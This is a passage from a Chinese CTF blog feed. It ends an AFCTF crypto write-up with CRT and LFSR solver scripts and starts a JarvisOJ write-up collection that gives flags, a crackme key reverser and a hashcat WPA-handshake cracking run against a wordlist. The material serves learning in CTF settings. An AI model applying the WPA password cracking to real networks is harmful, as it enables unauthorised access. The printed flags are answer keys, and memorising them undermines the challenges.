&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;a1 =163305039963008322700958678938420655039108584848594236473036556130206292229761961459635355105529119955950769119000647821166302409987726181456624233820238004130596582552143052085826562771938653314722288583956794740182869336927141053110739981290237894112152720822014240230972011848683576402535994825309029822761855623903611335752059666683377536920052428648302389426609672118522003510398578217
d1 =347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413
a2 =151758100093328024755534362157152644916689556800407091638077262152051356374687426002691308331360911658681675621180784078464300557713597658668737755275578303683512763651424490696663046659762209459401095803407234074793144034799798937463085989364658809489473016814564284374253047111285307568938011571482613761721746338619879940928380741377367381517427341679641871126076991209176935339058909863
d2 =347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553
a3 = 346077592068259399350080379767941982003794373736058097723728104020814800897686828693026215723695173898771936691822530717642440410239211631306801809213192374695040232378965389612021366734818648007275332322621064659199680848745242700755440206949465953441277866419617961232234201083716216031999849609543380477085554544227121956015035672626500140341901966363694497881768843758979050832435224875
d3 =347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820819351

dd = d1*d2*d3
t1 = pow(dd&amp;#x2F;&amp;#x2F;d1,d1-2,d1)
assert(t1*d2*d3%d1 == 1)
t2 = pow(dd&amp;#x2F;&amp;#x2F;d2,d2-2,d2)
assert(t2*d1*d3%d2 == 1)
t3 = pow(dd&amp;#x2F;&amp;#x2F;d3,d3-2,d3)
assert(t3*d2*d1%d3 == 1)
s = a1*t1*d2*d3+a2*t2*d1*d3+a3*t3*d1*d2
p = 80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857
s %= dd
print(s)
s %= p
print(s)

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;最后结果转HEX转ASCII即可&lt;&#x2F;p&gt;
&lt;p&gt;题目生成代码有需要的邮件我叭&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-11&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{1sn&#x27;t_s0_int3Resting}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;fei-yu-qi-jie-1&quot;&gt;非预期解&lt;&#x2F;h3&gt;
&lt;p&gt;后来发现自己又犯蠢了。。。&lt;&#x2F;p&gt;
&lt;p&gt;因为选的素数……是用nextprime()选的，所以相差……不大……&lt;&#x2F;p&gt;
&lt;p&gt;你可以直接把那个素数转成字符串……和明文只有……最后一个字符不一样……&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;ZZ点数 + 10&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;nan-ti&quot;&gt;难题&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;yi-dao-you-qu-de-ti-mu&quot;&gt;一道有趣的题目&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-12&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;这道题来自dctf2015&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;#求出加密的比特位
def decrypt(cipherText):
    guessed_bits = [&amp;#x27;?&amp;#x27;] * len(cipherText)
    length = len(cipherText)
    i = 0
    orded_cipher = [ord(c) &amp;amp; 1 for c in cipherText]
    decrypt_r(orded_cipher, guessed_bits, i, length, 10)


def try_guess(orded_cipher, guessedbits, i, length, guess, space):
    guessedbits = list(guessedbits)
    guessedbits[i] = guess
    if i + space &amp;lt; length - 1:
        nextndx = i + space
    else:
        nextndx = space

    nextbit = orded_cipher[i] ^ guess
    if guess == 0:
        newspace = space + 1
    else:
        newspace = space - 1

    if guessedbits[nextndx] == &amp;#x27;?&amp;#x27; or guessedbits[nextndx] == nextbit:
        guessedbits[nextndx] = nextbit
        decrypt_r(orded_cipher, guessedbits, i + 1, length, newspace)

def decrypt_r(orded_cipher, guessedbits, i, length, space):
    if i &amp;gt;= length:
        print &amp;#x27;ok:&amp;#x27;, &amp;#x27;&amp;#x27;.join(str(c) for c in guessedbits)
        return
    if guessedbits[i] == &amp;#x27;?&amp;#x27;:
        try_guess(orded_cipher, guessedbits, i, length, 0, space)
        try_guess(orded_cipher, guessedbits, i, length, 1, space)
    elif guessedbits[i] == 0:
        try_guess(orded_cipher, guessedbits, i, length, 0, space)
    elif guessedbits[i] == 1:
        try_guess(orded_cipher, guessedbits, i, length, 1, space)
	#print &amp;#x27;&amp;#x27;.join(str(c) for c in guessedbits)


s=&amp;#x27;15120d1a0a0810010a031d3e31000d1d170d173b0d173b0c07060206&amp;#x27;
#print len(s)
s=s.decode(&amp;#x27;hex&amp;#x27;)
#print len(s)

decrypt(s)

#求出明文
sln=&amp;#x27;1010011010010101111111101001&amp;#x27;
ciph=s
print sln

import string
slv = [None] * len(sln)
def filling_pass(slv):
    while True:
        any = False
        space = 10
        for i in range(len(sln)):
            if i + space &amp;lt; len(sln) - 1:
                nx = i + space
            else:
                nx = space
            if sln[i] == &amp;#x27;0&amp;#x27;:
                space += 1
            else:
                space -= 1
            if slv[i] is not None:
                sn = ord(slv[i]) ^ ord(ciph[i])
                if slv[nx] is None:
                    slv[nx] = chr(sn)
                    if (sn &amp;gt;= 32 and sn &amp;lt; 127) or sn == 10 or sn == 13:
                        any = True
                    else:
                        return False
                else:
                    if slv[nx] != chr(sn):
                        return False
        if not any:
            return True

def tryit(slvo, start):
    while slvo[start] is not None:
        start += 1
        if start &amp;gt;= len(slvo):
            print &amp;#x27;&amp;#x27;.join(&amp;#x27; &amp;#x27; if c is None else &amp;#x27;.&amp;#x27; if ord(c) &amp;lt; 32 else c for c in slvo)
            return
        continue
    for c in string.printable:
        slv = list(slvo)
        slv[start] = c
        possible = filling_pass(slv)
        if possible:
            tryit(slv, start)

print tryit(slv, 0)

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;flag-12&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{cryptanalysis_is_hard}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;fast-lfsr&quot;&gt;Fast LFSR&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-13&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;使用LFSR生成流密钥，具体名称是Geffe Generator&lt;&#x2F;p&gt;
&lt;p&gt;攻击方式是快速相关攻击（Fast Correlation Attack）&lt;&#x2F;p&gt;
&lt;p&gt;原题出自强网杯StreamGame3，出题的时候还搜不到可用的WP&lt;&#x2F;p&gt;
&lt;p&gt;具体请查看论文以及网上WP如&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;blog.leanote.com&#x2F;post&#x2F;xp0intjnu@gmail.com&#x2F;66c91498d13b&quot;&gt;这篇&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-13&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{01abcd056789123456}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>JarvisOJ-WP合集</title>
		<published>2018-05-10T09:11:00+08:00</published>
		<updated>2020-08-07T01:54:43.005696+08:00</updated>
		<link rel="alternate" href="https://CSUwangj.github.io/jarvisoj-wphe-ji/" type="text/html"/>
		<id>https://CSUwangj.github.io/jarvisoj-wphe-ji/</id>
		<content type="html">&lt;p&gt;因为预感进度表会很长，所以不放了&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;bu-zi-ci-tiao-zhuan-de-jin-du-biao&quot;&gt;不资瓷跳转的进度表&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Basic
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
base64&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
关于USS Lab.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
veryeasy&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
段子&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
手贱&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
美丽的实验室logo&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
神秘的文件&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
公倍数&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Easy Crackme&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Secret&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
爱吃培根的出题人&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Easy RSA&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
ROPGadget&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
取证&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
熟悉的声音&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Baby&#x27;s Crack&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Help!!&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Shellcode&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
A Piece Of Cake&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
-.-字符串&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
德军的密码&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
握手包&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Crypto
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
Medium RSA&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
BrokenPic&lt;&#x2F;li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
hard RSA&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;x-basic&quot;&gt;[Ｘ] Basic&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;x-base64&quot;&gt;[Ｘ] base64&lt;&#x2F;h2&gt;
&lt;p&gt;注意到没有小写字母和大点的数字，猜测是base32，解完以后是一个十六进制字符串，转ASCII解得&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{Just_t3st_h4v3_f4n}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-guan-yu-uss-lab&quot;&gt;[Ｘ] 关于USS Lab.&lt;&#x2F;h2&gt;
&lt;p&gt;搜索得到答案，注意题目里说的是USS Lab。&lt;&#x2F;p&gt;
&lt;p&gt;顺便其实点开about就能看到全称（233&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-1&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{ubiquitous_system_security}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-veryeasy&quot;&gt;[Ｘ] veryeasy&lt;&#x2F;h2&gt;
&lt;p&gt;打开文件我就知道要用strings命令，但是我就不，我就翻&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-2&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{strings_i5_3asy_isnt_i7}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-duan-zi&quot;&gt;[Ｘ] 段子&lt;&#x2F;h2&gt;
&lt;p&gt;将锟斤拷存ANSI编码，然后HEX编辑器打开就好&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-3&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{EFBFBDEFBFBD}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-shou-jian&quot;&gt;[Ｘ] 手贱&lt;&#x2F;h2&gt;
&lt;p&gt;直接解MD5，然后发现说不是标准MD5值，发现长度为33&lt;&#x2F;p&gt;
&lt;p&gt;再看看具体的，发现里面有个$L$的小写，删了解MD5得flag&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-4&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{hack}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-mei-li-de-shi-yan-shi-logo&quot;&gt;[Ｘ] 美丽的实验室logo&lt;&#x2F;h2&gt;
&lt;p&gt;binwalk没有额外东西&lt;&#x2F;p&gt;
&lt;p&gt;但是可以发现不是裸的jpg，strings可以看到Adobe公司工具编辑的痕迹，回去继续&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;不对，用Stegsolver的Frame Browser看到了flag&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-5&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{You_are_R3ally_Car3ful}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-veryeasyrsa&quot;&gt;[Ｘ] veryeasyRSA&lt;&#x2F;h2&gt;
&lt;p&gt;RSA-tool直接上啦~&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525919629975.png&quot; alt=&quot;veryeasyRSA&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-6&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{19178568796155560423675975774142829153827883709027717723363077606260717434369}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-shen-mi-de-wen-jian&quot;&gt;[Ｘ] 神秘的文件&lt;&#x2F;h2&gt;
&lt;p&gt;file&#x2F;binwalk指令得到这是一个exT文件系统数据，strings结果也奇怪&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525920969858.png&quot; alt=&quot;神秘的文件&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;索性打开文件看，发现有一堆\x00&lt;&#x2F;p&gt;
&lt;p&gt;但是往下翻发现有些其他东西&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525921057979.png&quot; alt=&quot;神秘的文件_2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;然后找到P&#x2F;C&#x2F;T，想着能不能移除&lt;code&gt;\x00&lt;&#x2F;code&gt;得到flag&lt;&#x2F;p&gt;
&lt;p&gt;然后的确得到了，但是结果失败了&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525922016986.png&quot; alt=&quot;神秘的文件_3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;因为错位包括前后错位，所以直接拼凑也是会失败的&lt;&#x2F;p&gt;
&lt;p&gt;看来还是需要文件系统，用命令&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;mount -o loop haha.f38a74f55b4e193561d1b707211cf7eb &#x2F;mnt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;装载文件系统之后，发现每个文件里一个字符，所以写出脚本&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;import os
s = &amp;quot;&amp;quot;
for i in range(0, 254):
	f = open(str(i), &amp;quot;r&amp;quot;)
	s += f.read()
	f.close()
print(s)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到flag&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-7&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{P13c3_7oghter_i7}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-gong-bei-shu&quot;&gt;[Ｘ] 公倍数&lt;&#x2F;h2&gt;
&lt;p&gt;1s大概做1e8的计算，所以可以直接暴力算就好&lt;&#x2F;p&gt;
&lt;p&gt;代码就没必要放了吧~&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-8&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{233333333166666668}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-easy-crackme&quot;&gt;[Ｘ] Easy Crackme&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525966589251.png&quot; alt=&quot;Easy Crackme&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;算法很简单，第一位异或以后，后面24位每6位一组和对应位置异或，然后进行比较&lt;&#x2F;p&gt;
&lt;p&gt;写出逆算法&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
using namespace std;
unsigned char a[27] = {
    0xFB, 0x9E, 0x67, 0x12, 0x4E, 0x9D, 0x98, 0xAB, 0x00, 0x06, 0x46, 0x8A, 0xF4, 0xB4, 0x06, 0x0B,
    0x43, 0xDC, 0xD9, 0xA4, 0x6C, 0x31, 0x74, 0x9C, 0xD2, 0xA0, 0
};
int ar[6] = {-35,51,84,53,-17,-85};
int main()
{
	a[0]^=0xab;
	for(int i=0;i&amp;lt;25;++i){
		a[i+1]^=ar[i%6];
	}
	puts((const char *)a);
    return 0;
}

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;flag-9&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{r3v3Rse_i5_v3ry_eAsy}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-secret&quot;&gt;[Ｘ]  Secret&lt;&#x2F;h2&gt;
&lt;p&gt;打开，F12，网络，刷新，得到&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525960605970.png&quot; alt=&quot;Secret&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-10&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{Welcome_to_phrackCTF_2016}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-ai-chi-pei-gen-de-chu-ti-ren&quot;&gt;[Ｘ]  爱吃培根的出题人&lt;&#x2F;h2&gt;
&lt;p&gt;提示够明显了，小写字母-&amp;gt;A，大写字母-&amp;gt;B，&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;mothereff.in&#x2F;bacon&quot;&gt;培根密码解密&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-11&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;h2 id=&quot;x-easy-rsa&quot;&gt;[Ｘ] Easy RSA&lt;&#x2F;h2&gt;
&lt;p&gt;提示明显&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-12&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{3a5Y}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-ropgadget&quot;&gt;[Ｘ] ROPGadget&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525961626864.png&quot; alt=&quot;ROPGadget&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-13&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{94C38B08890A5BC3}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-qu-zheng&quot;&gt;[Ｘ] 取证&lt;&#x2F;h2&gt;
&lt;p&gt;搜索得软件名Volatility&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-14&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{volatility}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-shou-xi-de-sheng-yin&quot;&gt;[Ｘ] 熟悉的声音&lt;&#x2F;h2&gt;
&lt;p&gt;摩尔斯-&amp;gt;凯撒&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-15&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{PHRACKCTF}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-baby-s-crack&quot;&gt;[Ｘ] Baby&#x27;s Crack&lt;&#x2F;h2&gt;
&lt;p&gt;很简单的加密，都不用写逆算法了，直接爆破吧！&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
char a[] = &amp;quot;jeihjiiklwjnk{ljj{kflghhj{ilk{k{kij{ihlgkfkhkwhhjgly&amp;quot;;
char b[] = &amp;quot;jeihjiiklwjnk{ljj{kflghhj{ilk{k{kij{ihlgkfkhkwhhjgly&amp;quot;;&amp;#x2F;&amp;#x2F;这里可以为空，我只是方便设置长度搞得
int main()
{
	int len = strlen(a);
	for(int i=0;i&amp;lt;len;++i){
		int ok = 0;
		for(int j=32;j&amp;lt;255&amp;amp;&amp;amp;!ok;++j){
			int cur = j;
			if ( j &amp;gt; 47 &amp;amp;&amp;amp; j &amp;lt;= 96 ){
          		j += 53;
        	}else if ( j &amp;lt;= 46 ){
          		j += j % 11;
        	}else{
          		j = 61 * (j &amp;#x2F; 61);
        	}
        	if(j==a[i]){
        		&amp;#x2F;&amp;#x2F;ok=1;这里加上注释是为了确认每次解的唯一
        		b[i]=cur;
        		putchar(cur);
        	}
        	j=cur;
        }
        putchar(&amp;#x27;\n&amp;#x27;);
    }
    puts(b);
	return 0;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到的结果转ASCII就好&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-16&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{You_ar3_Good_Crack3R}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-help&quot;&gt;[Ｘ] Help!!&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525968750571.png&quot; alt=&quot;Help!!&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;打开word没有发现flag，binwalk&#x2F;strings也没有&lt;&#x2F;p&gt;
&lt;p&gt;于是解压word，发现有两张图，OK&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-17&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{You_Know_moR3_4boUt_woRd}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-shellcode&quot;&gt;[Ｘ] Shellcode&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525973282058.png&quot; alt=&quot;Shellcode&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-18&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{Begin_4_good_pwnn3r}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-a-piece-of-cake&quot;&gt;[Ｘ] A Piece Of Cake&lt;&#x2F;h2&gt;
&lt;p&gt;一眼就看出来是单表替换，quip解决&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-19&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;PCTF{substitutepassisveryeasyyougotit}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-zi-fu-chuan&quot;&gt;[Ｘ] -.-字符串&lt;&#x2F;h2&gt;
&lt;p&gt;一目了然&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-20&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;522018D665387D1DA931812B77763410&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-de-jun-de-mi-ma&quot;&gt;[Ｘ] 德军的密码&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525970989136.png&quot; alt=&quot;德军的密码&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;然后解得flag&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-21&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;WELCOMECISRG&lt;&#x2F;p&gt;
&lt;h2 id=&quot;x-wo-shou-bao&quot;&gt;[Ｘ] 握手包&lt;&#x2F;h2&gt;
&lt;p&gt;下载发现是个cap包，中文搜索无果，搜&amp;quot;Kali handshake crack&amp;quot;，搜到hashcat，找到&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;hashcat.net&#x2F;wiki&#x2F;doku.php?id=cracking_wpawpa2&quot;&gt;这个网站&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;照葫芦画瓢&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;A:\Downloads\Compressed\hashcat-4.1.0
λ hashcat64.exe -m 2500 9640_1525972232.hccapx rockyou.txt
hashcat (v4.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause &amp;quot;CL_OUT_OF_RESOURCES&amp;quot; or related errors.
             To disable the timeout, see: https:&amp;#x2F;&amp;#x2F;hashcat.net&amp;#x2F;q&amp;#x2F;timeoutpatch
